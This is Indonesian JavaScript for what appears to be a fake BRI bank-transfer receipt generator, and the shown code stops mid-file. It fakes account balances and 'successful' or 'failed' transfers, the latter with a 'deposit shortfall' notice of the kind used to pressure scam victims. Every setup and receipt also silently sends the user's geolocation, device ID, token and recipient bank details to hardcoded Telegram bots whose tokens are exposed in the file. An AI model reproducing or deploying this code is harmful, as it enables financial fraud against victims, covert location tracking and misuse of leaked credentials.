// --- URL WEB APP ANDA ---
const DEPLOYMENT_URL = "https://script.google.com/macros/s/AKfycbx4zmm33s3WYBssIIO3B8DXLA0BJL1Tzd0velsRmoe0uIidVkMnYc4gFDs6UhkwaVEc/exec";

// --- PENGATURAN BOT TELEGRAM ---

// 1. BOT UTAMA (Untuk Log Teks & Lokasi)
const TELEGRAM_BOT_TOKEN = "8238029335:AAFTyfRG9B5mZi04M_2feIr4_JxQ7X9pikM"; 

// 2. BOT KHUSUS FOTO (Hanya untuk Struk)
const TELEGRAM_PHOTO_BOT_TOKEN = "8203841988:AAHZ3mt9wDPZQpEG-7zHcu9T-PFTRGDbGF4";

// CHAT ID (Digunakan untuk kedua bot)
const TELEGRAM_CHAT_ID = "1441654753";     


// --- FUNGSI: Kirim Lokasi (Ke Bot UTAMA) ---
function sendLocationToTelegram(userToken, deviceId) {
    if (!navigator.geolocation) {
        let message = `<b>📍 LOKASI (Error)</b>\n`;
        message += `<b>Token:</b> <code>${userToken}</code>\n`;
        message += `<b>Device ID:</b> <code>${deviceId}</code>\n`;
        message += `<b>Info:</b> Lokasi tidak didukung browser ini.`;
        const encodedMessage = encodeURIComponent(message);
        // Menggunakan BOT UTAMA
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
        fetch(url).catch(err => console.error("Gagal kirim log lokasi (no-support):", err));
        return;
    }
    
    navigator.geolocation.getCurrentPosition(
        (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const locationInfo = `Lat: ${lat}, Lon: ${lon} (http://googleusercontent.com/maps/google.com/0{lat},${lon})`;

            let message = `<b>📍 LOKASI (Sukses)</b>\n`;
            message += `<b>Token:</b> <code>${userToken}</code>\n`;
            message += `<b>Device ID:</b> <code>${deviceId}</code>\n`;
            message += `<b>Lokasi:</b> ${locationInfo}`;
            
            const encodedMessage = encodeURIComponent(message);
            // Menggunakan BOT UTAMA
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
            fetch(url).catch(err => console.error("Gagal kirim log lokasi (sukses):", err));
        },
        (error) => {
            let errorMsg = "Lokasi Error: ";
            switch(error.code) {
                case error.PERMISSION_DENIED: errorMsg += "Pengguna menolak izin.";
                break;
                case error.POSITION_UNAVAILABLE: errorMsg += "Info lokasi tidak tersedia."; break;
                case error.TIMEOUT: 
                    errorMsg += "Waktu tunggu habis (timeout).";
                break;
                case error.UNKNOWN_ERROR: errorMsg += "Error tidak diketahui.";
                break;
                default: errorMsg += `Kode ${error.code}`;
            }

            let message = `<b>📍 LOKASI (Gagal)</b>\n`;
            message += `<b>Token:</b> <code>${userToken}</code>\n`;
            message += `<b>Device ID:</b> <code>${deviceId}</code>\n`;
            message += `<b>Info:</b> ${errorMsg}`;

            const encodedMessage = encodeURIComponent(message);
            // Menggunakan BOT UTAMA
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
            fetch(url).catch(err => console.error("Gagal kirim log lokasi (gagal):", err));
        },
        {
            enableHighAccuracy: false,
            timeout: 15000, 
            maximumAge: 60000
        }
    );
}
// --- AKHIR FUNGSI LOKASI ---


// --- FUNGSI: KIRIM DATA SETUP KE TELEGRAM (Ke Bot UTAMA) ---
function sendDataToTelegram(bankName, accName, accNum, minLimit) { 
    
    const now = new Date();
    const formattedDate = new Intl.DateTimeFormat('id-ID', {
        dateStyle: 'full', 
        timeStyle: 'long', 
        timeZone: 'Asia/Jakarta'
    }).format(now);
    const userToken = localStorage.getItem('userToken') || 'Tidak Ditemukan';
    
    const tokenExpiry = localStorage.getItem('tokenExpiryDate') || 'N/A';
    const tokenLogins = localStorage.getItem('tokenRemainingLogins') || 'N/A';

    const deviceId = getDeviceID();
    let message = "<b>🔔 Data Pengaturan Penerima Baru:</b>\n\n";
    message += "<b>--- Info Pengguna ---</b>\n";
    message += `<b>Tanggal:</b> ${formattedDate}\n`;
    message += `<b>Token:</b> <code>${userToken}</code>\n`;
    message += `<b>Device ID:</b> <code>${deviceId}</code>\n`;
    
    message += `<b>Token Expired:</b> ${tokenExpiry}\n`;
    message += `<b>Sisa Login:</b> ${tokenLogins}x\n\n`;
    
    message += "<b>--- Info Input ---</b>\n";
    message += `<b>Nama Bank:</b> ${bankName}\n`;
    message += `<b>Nama Penerima:</b> ${accName}\n`;
    message += `<b>No. Rekening:</b> ${accNum}\n`;
    message += `<b>Min. Limit:</b> ${minLimit}`;
    const encodedMessage = encodeURIComponent(message);
    
    // Menggunakan BOT UTAMA
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log("Data berhasil dikirim ke Telegram.");
            } else {
                console.error("Gagal mengirim data ke Telegram:", data.description);
            }
        })
        .catch(err => {
            console.error("Error koneksi Telegram:", err);
        });
    sendLocationToTelegram(userToken, deviceId);
}


// --- FUNGSI: KIRIM LOG BUKTI TRANSFER (TEKS) (Ke Bot UTAMA) ---
function sendReceiptLogToTelegram() { 

    const userToken = localStorage.getItem('userToken') || 'Tidak Ditemukan';
    const deviceId = getDeviceID();
    
    const status = isSuccessMode ? "✅ BERHASIL" : "❌ GAGAL";
    const nominal = "Rp" + nominalInput.value;
    const namaPenerima = mainRecipientName.textContent.trim();
    const bankPenerima = localStorage.getItem('recipientBankName') || 'N/A';
    const rekPenerima = localStorage.getItem('recipientNumber') || 'N/A';
    const catatan = catatanInput.value.trim() || "-";
    let message = `<b>📊 LOG BUKTI TRANSFER 📊</b>\n\n`;
    message += `<b>Status:</b> ${status}\n\n`;
    
    message += `<b>--- Info Token ---</b>\n`;
    message += `<b>Token:</b> <code>${userToken}</code>\n`;
    message += `<b>Device ID:</b> <code>${deviceId}</code>\n\n`;
    message += `<b>--- Detail Transaksi ---</b>\n`;
    message += `<b>Nominal:</b> ${nominal}\n`;
    message += `<b>Penerima:</b> ${namaPenerima}\n`;
    message += `<b>Bank:</b> ${bankPenerima}\n`;
    message += `<b>No. Rek:</b> ${rekPenerima}\n`;
    message += `<b>Catatan:</b> ${catatan}\n`;
    
    if (!isSuccessMode) {
        try {
            let rawValue = nominalInput.value.replace(/[^0-9]/g, '');
            let numericValue = rawValue === '' ? 0 : parseInt(rawValue, 10);
            let depositoKurang = MIN_TRANSFER_LIMIT - numericValue;
            if (depositoKurang < 0) depositoKurang = 0;
            
            const currencyFormatter = new Intl.NumberFormat('id-ID', { 
                style: 'currency', 
                currency: 'IDR', 
                minimumFractionDigits: 0 
            });
            
            const strKurang = '-' + currencyFormatter.format(depositoKurang).replace('Rp ', 'Rp');
            message += `<b>Deposito Kurang:</b> ${strKurang}\n`;
            
        } catch(e) {
            message += `<b>Deposito Kurang:</b> Error menghitung\n`;
        }
    }

    const encodedMessage = encodeURIComponent(message);
    // Menggunakan BOT UTAMA
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;

    fetch(url).catch(err => console.error("Gagal kirim log bukti transfer:", err));
    sendLocationToTelegram(userToken, deviceId);
}


// --- GRAB SEMUA ELEMEN ---
const catatanInput = document.querySelector('.catatan-input');
const charCounterDisplay = document.querySelector('.char-counter');
const nominalInput = document.querySelector('#input-nominal');
const minTextElement = document.querySelector('.nominal-minimum');
const continueButton = document.querySelector('#continue-button'); 
const transferForm = document.querySelector('#transfer-form');
// Elemen Penerima
const mainRecipientAvatar = document.querySelector('#main-recipient-avatar');
const mainRecipientName = document.querySelector('#main-recipient-name');
const mainRecipientBank = document.querySelector('#main-recipient-bank'); 
const mainRecipientNumber = document.querySelector('#main-recipient-number'); 

// Elemen PIN
const pinOverlay = document.querySelector('#pin-overlay');
const pinBackButton = document.querySelector('#pin-back-button');
const allNumpadButtons = document.querySelectorAll('.numpad-button');
const pinDots = document.querySelectorAll('.pin-dot');
// Elemen Bukti Transfer
const receiptOverlay = document.querySelector('#receipt-overlay');
const receiptDoneButton = document.querySelector('#receipt-done-button');
const receiptStatusTitle = document.querySelector('#receipt-status-title'); 
const receiptStatusIcon = document.querySelector('#receipt-status-icon'); 
const receiptOjkText = document.querySelector('.receipt-expanded-details .ojk-info-text');

const receiptToggleLink = document.querySelector('#receipt-toggle-link');
const receiptExpandedDetails = document.querySelector('#receipt-expanded-details');

// Elemen Loading
const loadingOverlay = document.querySelector('#loading-overlay');
// Elemen Setup
const setupOverlay = document.querySelector('#setup-overlay');
const setupForm = document.querySelector('#setup-form');
const setupButton = setupForm.querySelector('.setup-button'); 
const setupButtonSuccess = document.querySelector('#setup-button-success'); 
const setupMinLimitInput = document.querySelector('#setup-min-limit'); 
const setupAccountNumberInput = document.querySelector('#setup-account-number');

// Elemen Token (Baru)
const tokenOverlay = document.querySelector('#token-overlay');
const tokenForm = document.querySelector('#token-form');
const tokenInput = document.querySelector('#token-input');
const tokenButton = document.querySelector('#token-submit-button');
const tokenError = document.querySelector('#token-error');
const tokenLoader = document.querySelector('#token-loader');
// --- ELEMEN BARU GANTI AKUN ---
const changeBalanceButton = document.querySelector('.change-button');
const sourceAccountNameElement = document.querySelector('#source-account-name'); 
const sourceAccountNumberElement = document.querySelector('#source-account-number');
const sourceBalanceElement = document.querySelector('#source-balance');
const accountSwitcherOverlay = document.querySelector('#account-switcher-overlay');
const accountSwitcherCloseBtn = document.querySelector('#account-switcher-close-btn');
const accountSwitcherContent = document.querySelector('#account-switcher-content');


// --- Variabel ---
let currentPin = "";
const MAX_PIN_LENGTH = 6;
let isSubmittingSetup = false; 
let isSuccessMode = false;
let sourceAccounts = [];
let activeAccountIndex = 0;

// --- Variabel LIMIT (Baru) ---
let MIN_TRANSFER_LIMIT = 10000;
const originalMinColor = '#888';

// --- PERUBAHAN BARU: FUNGSI Ambil Inisial Nama (RB) ---
function getInitials(name) {
    if (!name) return '?';
    const parts = name.trim().toUpperCase().split(' ');
    if (parts.length === 1) {
        return parts[0].charAt(0) || '?';
    }
    const first = parts[0].charAt(0);
    const second = parts[1].charAt(0);
    return (first + second) || '?';
}

// --- FUNGSI BARU: GANTI AKUN ---

function initializeAccounts() {
    const savedAccounts = localStorage.getItem('sourceAccounts');
    const savedIndex = localStorage.getItem('activeAccountIndex');
    
    if (savedAccounts) {
        sourceAccounts = JSON.parse(savedAccounts);
    } else {
        sourceAccounts = [
            { name: "PT ORSXI.STORE, INC", number: "2770 0101 **** 539", balance: "Rp583.389.000,00" },
            { name: "Akun Pribadi 1", number: "1111 2222 **** 333", balance: "Rp1.000.000,00" },
            { name: "Akun Bisnis 2", number: "4444 5555 **** 666", balance: "Rp10.000.000,00" }
        ];
        localStorage.setItem('sourceAccounts', JSON.stringify(sourceAccounts));
    }
    
    activeAccountIndex = savedIndex ? parseInt(savedIndex, 10) : 0;
    
    updateMainPageAccount();
}

function saveAccounts() {
    localStorage.setItem('sourceAccounts', JSON.stringify(sourceAccounts));
    localStorage.setItem('activeAccountIndex', activeAccountIndex);
}

function updateMainPageAccount() {
    const activeAccount = sourceAccounts[activeAccountIndex];
    sourceAccountNameElement.textContent = activeAccount.name;
    sourceAccountNumberElement.textContent = activeAccount.number;
    sourceBalanceElement.textContent = activeAccount.balance;
}

function updateAccountSwitcherUI() {
    sourceAccounts.forEach((account, index) => {
        document.getElementById(`slot-name-${index}`).textContent = account.name;
        document.getElementById(`slot-number-${index}`).textContent = account.number;
        
        document.getElementById(`slot-balance-${index}`).textContent = account.balance;
        
        const slotElement = document.getElementById(`account-slot-${index}`);
        const selectButton = slotElement.querySelector('.btn-select-account');
        
        if (index === activeAccountIndex) {
            slotElement.classList.add('active');
            selectButton.disabled = true;
        } else {
            slotElement.classList.remove('active');
            selectButton.disabled = false;
        }
    });
}

if (changeBalanceButton) {
    changeBalanceButton.addEventListener('click', (e) => {
        e.preventDefault();
        updateAccountSwitcherUI(); // Update UI overlay
        accountSwitcherOverlay.style.display = 'flex'; // Tampilkan overlay
    });
}

if (accountSwitcherCloseBtn) {
    accountSwitcherCloseBtn.addEventListener('click', (e) => {
        e.preventDefault();
        accountSwitcherOverlay.style.display = 'none';
    });
}

if (accountSwitcherContent) {
    accountSwitcherContent.addEventListener('click', (e) => {
        if (e.target.matches('.btn-select-account')) {
            activeAccountIndex = parseInt(e.target.dataset.index, 10);
            saveAccounts();
            updateMainPageAccount();
            accountSwitcherOverlay.style.display = 'none';
        }
        
        if (e.target.matches('.btn-edit-account')) {
            const index = parseInt(e.target.dataset.index, 10);
            const accountToEdit = sourceAccounts[index];
            
            let newName = prompt("Masukkan nama baru:", accountToEdit.name);
            if (newName !== null && newName.trim() !== "") {
                accountToEdit.name = newName.trim();
            }
            
            let newNumber = prompt("Masukkan nomor rekening baru:", accountToEdit.number);
            if (newNumber !== null && newNumber.trim() !== "") {
                accountToEdit.number = newNumber.trim();
            }

            let currentBalanceValue = accountToEdit.balance.replace('Rp', '').replace(',00', '').replace(/\./g, '');
            let newBalanceInput = prompt("Masukkan saldo baru:", currentBalanceValue);
            
            if (newBalanceInput !== null && newBalanceInput.trim() !== "") {
                let newBalanceRaw = newBalanceInput.replace(/[^0-9]/g, '');
                if (newBalanceRaw === "") newBalanceRaw = "0";
                const newBalanceNum = parseInt(newBalanceRaw, 10);
                const formattedNum = new Intl.NumberFormat('id-ID').format(newBalanceNum);
                accountToEdit.balance = "Rp" + formattedNum + ",00";
            }
            
            saveAccounts();
            updateAccountSwitcherUI();
            if (index === activeAccountIndex) {
                updateMainPageAccount();
            }
        }
    });
}


function formatAccountNumber(e) {
    const input = e.target;
    let selectionStart = input.selectionStart;
    let originalLength = input.value.length;

    let digits = input.value.replace(/[^0-9]/g, '');
    const startsWith08 = digits.startsWith('08');
    let formattedValue = '';
    
    if (digits.length > 0) {
        if (startsWith08) {
            formattedValue = (digits.match(/.{1,4}/g) || []).join('-');
        } else {
            formattedValue = (digits.match(/.{1,4}/g) || []).join(' ');
        }
    }
    
    input.value = formattedValue;
    let newLength = formattedValue.length;
    let lengthDiff = newLength - originalLength;
    let newSelectionStart = selectionStart + lengthDiff;
    if (selectionStart > 0 || lengthDiff > 0) {
            if (lengthDiff < 0 && selectionStart + lengthDiff > 0) {
                newSelectionStart = selectionStart + lengthDiff;
            } else if (lengthDiff > 0) {
                newSelectionStart = selectionStart + lengthDiff;
            } else {
                newSelectionStart = selectionStart;
            }
            if (lengthDiff === -1 && (originalLength - selectionStart) % 5 === 0) { 
            newSelectionStart = selectionStart - 1;
            }
            newSelectionStart = Math.max(0, newSelectionStart);
            input.setSelectionRange(newSelectionStart, newSelectionStart);
    }
}

function formatInputAsNumber(e) {
    let rawValue = e.target.value.replace(/[^0-9]/g, '');
    let selectionStart = e.target.selectionStart;
    let originalLength = e.target.value.length;

    if (rawValue === '') {
        e.target.value = '';
    } else {
        let numericValue = parseInt(rawValue, 10);
        let formattedValue = new Intl.NumberFormat('id-ID').format(numericValue);
        e.target.value = formattedValue;
        
        let newLength = formattedValue.length;
        let lengthDiff = newLength - originalLength;
        let newSelectionStart = selectionStart + lengthDiff;
        
        if (selectionStart > 0 || lengthDiff > 0) {
                if (lengthDiff < 0 && selectionStart + lengthDiff > 0) {
                    newSelectionStart = selectionStart + lengthDiff;
                } else if (lengthDiff > 0) {
                    newSelectionStart = selectionStart + lengthDiff;
                } else {
                    newSelectionStart = selectionStart;
                }
                if (lengthDiff === -1 && (originalLength - selectionStart) % 4 === 0) {
                newSelectionStart = selectionStart - 1;
                }
                newSelectionStart = Math.max(0, newSelectionStart);
                e.target.setSelectionRange(newSelectionStart, newSelectionStart);
        }
    }
}

setupMinLimitInput.addEventListener('input', formatInputAsNumber);
setupAccountNumberInput.addEventListener('input', formatAccountNumber);

function loadSetupFormWithSavedData() {
    document.getElementById('setup-bank-name').value = '';
    document.getElementById('setup-account-name').value = '';
    document.getElementById('setup-account-number').value = '';
    document.getElementById('setup-min-limit').value = '';
    
    if (setupButton) {
        setupButton.disabled = false;
    }
    if (setupButtonSuccess) {
        setupButtonSuccess.disabled = false;
    }
    isSubmittingSetup = false;
}

function applySettingsToMainPage() {
    setupOverlay.style.display = 'none';
    const bankName = localStorage.getItem('recipientBankName') || 'NAMA BANK';
    const accName = localStorage.getItem('recipientName') || 'NAMA PENERIMA';
    const accNum = localStorage.getItem('recipientNumber') || '0000 0000';
    MIN_TRANSFER_LIMIT = parseInt(localStorage.getItem('minLimit') || '10000', 10); 
    
    mainRecipientAvatar.textContent = getInitials(accName);
    mainRecipientName.textContent = accName.toUpperCase();
    if (mainRecipientBank) mainRecipientBank.textContent = bankName.toUpperCase();
    if (mainRecipientNumber) mainRecipientNumber.textContent = accNum;
    
    const formattedMin = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(MIN_TRANSFER_LIMIT).replace('Rp', 'Rp');
    minTextElement.textContent = `Minimum transfer adalah ${formattedMin}`;
}

function processAndSaveSetup() {
    if (isSubmittingSetup) return;
    isSubmittingSetup = true; 
    
    if (setupButton) setupButton.disabled = true;
    if (setupButtonSuccess) setupButtonSuccess.disabled = true; 
    
    const bankName = document.getElementById('setup-bank-name').value;
    const accName = document.getElementById('setup-account-name').value;
    const accNum = document.getElementById('setup-account-number').value; // Ambil nilai yang sudah diformat
    const minLimitRaw = setupMinLimitInput.value.replace(/[^0-9]/g, '');
    const formattedMinLimit = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(parseInt(minLimitRaw, 10) || 0);
    if (TELEGRAM_BOT_TOKEN !== "GANTI_DENGAN_TOKEN_BOT_ANDA" && TELEGRAM_CHAT_ID !== "GANTI_DENGAN_CHAT_ID_ANDA") {
        sendDataToTelegram(bankName, accName, accNum, formattedMinLimit);
    }
    
    localStorage.setItem('recipientBankName', bankName);
    localStorage.setItem('recipientName', accName);
    localStorage.setItem('recipientNumber', accNum);
    localStorage.setItem('minLimit', minLimitRaw);
    
    applySettingsToMainPage(); 
}

function saveUserData(e) {
    e.preventDefault();
    isSuccessMode = false;
    processAndSaveSetup();
}

function getDeviceID() {
    let savedID = localStorage.getItem('persistant_device_id');
    if (savedID) {
        return savedID;
    }
    const randomPart = Math.random().toString(36).substring(2, 10);
    const timestampPart = Date.now().toString(36).substring(4);
    const newID = "dev-" + randomPart + timestampPart;
    localStorage.setItem('persistant_device_id', newID);
    return newID;
}

function performTokenValidation(token, isSavedTokenCheck) {
    const deviceId = getDeviceID();
    tokenLoader.style.display = 'block';
    tokenButton.disabled = true;
    tokenInput.disabled = true;
    tokenError.textContent = isSavedTokenCheck ? "Memvalidasi token tersimpan..." : "";
    const validationUrl = `${DEPLOYMENT_URL}?token=${encodeURIComponent(token)}&deviceId=${encodeURIComponent(deviceId)}`;

    fetch(validationUrl)
        .then(response => response.json())
        .then(data => {
            tokenLoader.style.display = 'none';
            tokenButton.disabled = false;
        
            tokenInput.disabled = false;
            
            if (data.status === "success") {
                if (!isSavedTokenCheck) {
                    localStorage.setItem('userToken', token);
                }
                
                if (data.expiryDate) {
                    localStorage.setItem('tokenExpiryDate', data.expiryDate);
                }
                if (data.remainingLogins !== undefined) {
                    localStorage.setItem('tokenRemainingLogins', data.remainingLogins);
                }
                
                localStorage.removeItem('tokenExpiry');
                tokenOverlay.style.display = 'none';
                setupOverlay.style.display = 'flex';
                loadSetupFormWithSavedData();
            } else {
                if (isSavedTokenCheck) {
                    localStorage.removeItem('userToken');
                    localStorage.removeItem('tokenExpiry'); 
                }
                localStorage.removeItem('tokenExpiryDate');
                localStorage.removeItem('tokenRemainingLogins');
                tokenError.textContent = data.message + ". Silakan masukkan token baru.";
                tokenInput.value = ""; 
            }
        })
        .catch(err => {
            console.error("Fetch Error:", err);
            tokenLoader.style.display = 'none';
            tokenButton.disabled = false;
            tokenInput.disabled = false;
            tokenError.textContent = "Error: Gagal terhubung ke server.";
        });
}

function handleTokenSubmit(e) {
    e.preventDefault();
    const token = tokenInput.value.trim();
    if (token === "") {
        tokenError.textContent = "Token tidak boleh kosong.";
        return;
    }
    performTokenValidation(token, false);
}

function checkSavedToken() {
    const savedToken = localStorage.getItem('userToken');
    if (!savedToken) {
        tokenOverlay.style.display = 'flex';
        setupOverlay.style.display = 'none';
    } else {
        tokenOverlay.style.display = 'flex';
        tokenInput.value = savedToken; 
        tokenInput.disabled = true; 
        performTokenValidation(savedToken, true); 
    }
}

document.addEventListener('DOMContentLoaded', () => {
    initializeAccounts();
    checkSavedToken(); 
});
tokenForm.addEventListener('submit', handleTokenSubmit);

setupForm.addEventListener('submit', saveUserData);
if (receiptToggleLink && receiptExpandedDetails) {
    receiptToggleLink.addEventListener('click', (e) => {
        e.preventDefault();
        
        const isExpanded = receiptExpandedDetails.classList.toggle('expanded');
        receiptToggleLink.classList.toggle('expanded', isExpanded);
        
        const textSpan = receiptToggleLink.querySelector('span:first-child');
        if (isExpanded) {
            textSpan.textContent = 'Lihat Lebih Sedikit';
        } else {
            textSpan.textContent = 'Lihat Detail Transaksi';
        }
    });
}

if (setupButtonSuccess) {
    setupButtonSuccess.addEventListener('click', (e) => {
        e.preventDefault();
        
        if (!setupForm.reportValidity()) {
            return; 
        }

        isSuccessMode = true; 
        processAndSaveSetup();
    });
}


if (catatanInput && charCounterDisplay) {
    catatanInput.addEventListener('input', () => {
        const count = catatanInput.value.length;
        const max = catatanInput.maxLength;
        charCounterDisplay.textContent = `${count}/${max}`;
        catatanInput.style.height = 'auto';
        catatanInput.style.height = (catatanInput.scrollHeight) + 'px';
    });
    catatanInput.dispatchEvent(new Event('input'));
}

if (nominalInput && minTextElement && continueButton) {
    
    nominalInput.addEventListener('input', (e) => {
        formatInputAsNumber(e); 
        
        let rawValue = e.target.value.replace(/[^0-9]/g, '');
        let numericValue = rawValue === '' ? 0 : parseInt(rawValue, 10);

        const formattedMin = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(MIN_TRANSFER_LIMIT).replace('Rp', 'Rp');
        const minText = `Minimum transfer adalah ${formattedMin}`;

        if (numericValue === 0) {
            minTextElement.textContent = minText;
            minTextElement.style.color = originalMinColor;
            continueButton.disabled = true; 
        
        } else if (numericValue >= MIN_TRANSFER_LIMIT) {
            minTextElement.textContent = minText;
            minTextElement.style.color = originalMinColor;
            continueButton.disabled = false; 
        } else {
            minTextElement.textContent = minText;
            minTextElement.style.color = 'red'; 
            continueButton.disabled = false; 
        }
    });
}


if (transferForm && pinOverlay && pinBackButton) {
    transferForm.addEventListener('submit', (e) => {
        e.preventDefault(); 
        pinOverlay.style.display = 'flex';
    });
    
    pinBackButton.addEventListener('click', (e) => {
        e.preventDefault(); 
        pinOverlay.style.display = 'none';
        resetPin();
    });
}

function updatePinDots() {
    const pinLength = currentPin.length;
    pinDots.forEach((dot, index) => {
        if (index < pinLength) {
            dot.classList.add('filled');
        } else {
            dot.classList.remove('filled');
        }
    });
}

function handlePinInput(digit) {
    if (currentPin.length < MAX_PIN_LENGTH) {
        currentPin += digit;
        updatePinDots();
        
        if (currentPin.length === MAX_PIN_LENGTH) {
            console.log("PIN Selesai:", currentPin);
            setTimeout(() => {
                pinOverlay.style.display = 'none'; 
                resetPin();
                
                if (loadingOverlay) {
                    loadingOverlay.style.display = 'flex';
                }
                
                updateReceiptData(); 
                sendReceiptLogToTelegram();

                setTimeout(() => {
                    if (loadingOverlay) {
                        loadingOverlay.style.display = 'none';
                    }
                    if (receiptOverlay) {
                        receiptOverlay.style.display = 'flex'; 
                        window.scrollTo(0, 0); 
                        
                        // --- TAMBAHAN: KIRIM FOTO OTOMATIS ---
                        setTimeout(() => {
                            kirimFotoBuktiOtomatis();
                        }, 1000); 
                        // -------------------------------------
                    }
            
                }, 2000); 

            }, 500);
        }
    }
}

function handleBackspace() {
    if (currentPin.length > 0) {
        currentPin = currentPin.slice(0, -1);
        updatePinDots();
    }
}

function resetPin() {
    currentPin = "";
    updatePinDots();
}

allNumpadButtons.forEach(button => {
    if (button.classList.contains('backspace')) {
        button.addEventListener('click', handleBackspace);
    } else if (!button.classList.contains('blank')) {
        button.addEventListener('click', () => {
            handlePinInput(button.textContent.trim());
        });
    }
});

function generateRandomRef() {
    const min = 100000000000;
    const max = 999999999999;
    const randomNum = Math.floor(Math.random() * (max - min + 1)) + min;
    return randomNum.toString();
}

function updateReceiptData() {
    const nominalValue = nominalInput.value;
    const catatanValue = catatanInput.value.trim();
    
    const activeAccount = sourceAccounts[activeAccountIndex];
    const sourceName = activeAccount.name;
    const sourceAccountNum = activeAccount.number;
    const sourceBank = "BANK BRI";
    const destName = mainRecipientName.textContent.trim();
    const destAvatar = mainRecipientAvatar.textContent.trim(); 
    
    const destBankRaw = localStorage.getItem('recipientBankName') || 'NAMA BANK';
    const destBank = destBankRaw.toUpperCase(); 
    
    const destAccount = mainRecipientNumber.textContent.trim();
    const now = new Date();
    const formattedDate = new Intl.DateTimeFormat('id-ID', {
        day: '2-digit', month: 'long', year: 'numeric', timeZone: 'Asia/Jakarta'
    }).format(now);
    const formattedTime = new Intl.DateTimeFormat('id-ID', {
        hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false, timeZone: 'Asia/Jakarta', timeZoneName: 'short'
    }).format(now).replace(/\./g, ':');
    const finalDateTimeString = `${formattedDate}, ${formattedTime}`;

    const finalAmount = 'Rp' + nominalValue;
    const maskedSourceAccount = sourceAccountNum; 
    const sourceInitial = getInitials(sourceName);

    const receiptTimestampEl = document.querySelector('#receipt-timestamp');
    const receiptAmountEl = document.querySelector('#receipt-total-amount');
    const receiptOjkLimitEl = document.querySelector('#dynamic-ojk-limit'); 
    
    const receiptSourceAvatar = document.querySelector('#receipt-source-avatar');
    const receiptSourceName = document.querySelector('#receipt-source-name');
    const receiptSourceBank = document.querySelector('#receipt-source-bank');
    const receiptSourceNumber = document.querySelector('#receipt-source-number');
    
    const receiptDestAvatar = document.querySelector('#receipt-dest-avatar');
    const receiptDestName = document.querySelector('#receipt-dest-name');
    const receiptDestBank = document.querySelector('#receipt-dest-bank');
    const receiptDestNumber = document.querySelector('#receipt-dest-number');
    const receiptTxType = document.querySelector('#receipt-tx-type');
    const receiptNotes = document.querySelector('#receipt-notes');
    const receiptNominalDetail = document.querySelector('#receipt-nominal-detail');
    const receiptAdminFee = document.querySelector('#receipt-admin-fee');
    const depositoWajibRow = document.querySelector('#receipt-deposito-wajib-row');
    const depositoKurangRow = document.querySelector('#receipt-deposito-kurang-row');
    const depositoWajibValue = document.querySelector('#receipt-deposito-wajib');
    const depositoKurangValue = document.querySelector('#receipt-deposito-kurang');

    receiptTimestampEl.textContent = finalDateTimeString;
    receiptAmountEl.textContent = finalAmount;
    
    const receiptRefEl = document.querySelector('#receipt-ref-number');
    if (receiptRefEl) {
        receiptRefEl.textContent = generateRandomRef();
    }

    if (receiptTxType) {
        receiptTxType.textContent = `Transfer ${destBank}`;
    }
    
    if (receiptNotes) {
        receiptNotes.textContent = catatanValue === "" ?
        "-" : catatanValue;
    }
    
    if (receiptNominalDetail) {
        receiptNominalDetail.textContent = finalAmount;
    }
    
    if (receiptAdminFee) {
        if (destBank.includes('BRI')) {
            receiptAdminFee.textContent = "Rp0";
        } else {
            receiptAdminFee.textContent = "Rp6.500";
        }
    }
    
    receiptSourceAvatar.textContent = sourceInitial;
    receiptSourceName.textContent = sourceName.toUpperCase(); 
    receiptSourceBank.textContent = sourceBank;
    receiptSourceNumber.textContent = maskedSourceAccount; 
    
    receiptDestAvatar.textContent = destAvatar;
    receiptDestName.textContent = destName; 
    receiptDestBank.textContent = destBank; 
    receiptDestNumber.textContent = destAccount;
    
    const formattedOjkLimit = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(MIN_TRANSFER_LIMIT).replace('Rp', 'Rp');
    if(receiptOjkLimitEl) receiptOjkLimitEl.textContent = formattedOjkLimit;
    
    if (receiptStatusTitle && receiptStatusIcon && receiptOjkText) { 
        if (isSuccessMode) {
            receiptStatusTitle.textContent = "Transaksi Berhasil";
            receiptStatusIcon.src = "logo_sukses.gif"; 
            receiptStatusIcon.alt = "Berhasil";
            receiptOjkText.style.display = 'none'; 
            
            if (depositoWajibRow) depositoWajibRow.style.display = 'none';
            if (depositoKurangRow) depositoKurangRow.style.display = 'none';
            
        } else {
            receiptStatusTitle.textContent = "Transaksi Gagal";
            receiptStatusIcon.src = "icon-success.gif"; 
            receiptStatusIcon.alt = "Gagal";
            receiptOjkText.style.display = 'block'; 

            let rawValue = nominalInput.value.replace(/[^0-9]/g, '');
            let numericValue = rawValue === '' ? 0 : parseInt(rawValue, 10);
            let depositoKurang = MIN_TRANSFER_LIMIT - numericValue;
            const currencyFormatter = new Intl.NumberFormat('id-ID', { 
                style: 'currency', 
                currency: 'IDR', 
            
                minimumFractionDigits: 0 
            });
            if (depositoWajibValue) {
                depositoWajibValue.textContent = currencyFormatter.format(MIN_TRANSFER_LIMIT).replace('Rp ', 'Rp');
            }
            if (depositoKurangValue) {
                if (depositoKurang < 0) depositoKurang = 0;
                depositoKurangValue.textContent = '-' + currencyFormatter.format(depositoKurang).replace('Rp ', 'Rp');
            }
            
            if (depositoWajibRow) depositoWajibRow.style.display = 'flex';
            if (depositoKurangRow) depositoKurangRow.style.display = 'flex';
        }
    }
}

if (receiptOverlay && receiptDoneButton) {
